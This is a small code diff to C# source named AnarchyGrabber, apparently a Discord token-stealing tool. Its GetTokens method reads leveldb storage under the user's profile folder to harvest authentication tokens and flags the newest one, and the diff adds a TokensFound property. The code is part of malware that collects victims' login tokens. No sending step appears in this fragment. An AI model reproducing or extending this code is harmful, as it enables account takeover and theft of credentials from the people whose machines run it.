@@ -8,6 +8,9 @@ namespace AnarchyGrabber
 {
     public static class Grabber
     {
+        public static bool TokensFound { get; private set; }
+
+
         public static List<string> GetTokens(string dir, bool checkLogs = false)
         {
             DirectoryInfo leveldb = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
@@ -32,7 +35,10 @@ namespace AnarchyGrabber
             tokens = tokens.Distinct().ToList();
 
             if (tokens.Count > 0)
+            {
+                TokensFound = true;
                 tokens[tokens.Count - 1] += " - NEWEST";
+            }
             else
                 tokens.Add("No tokens found");
 
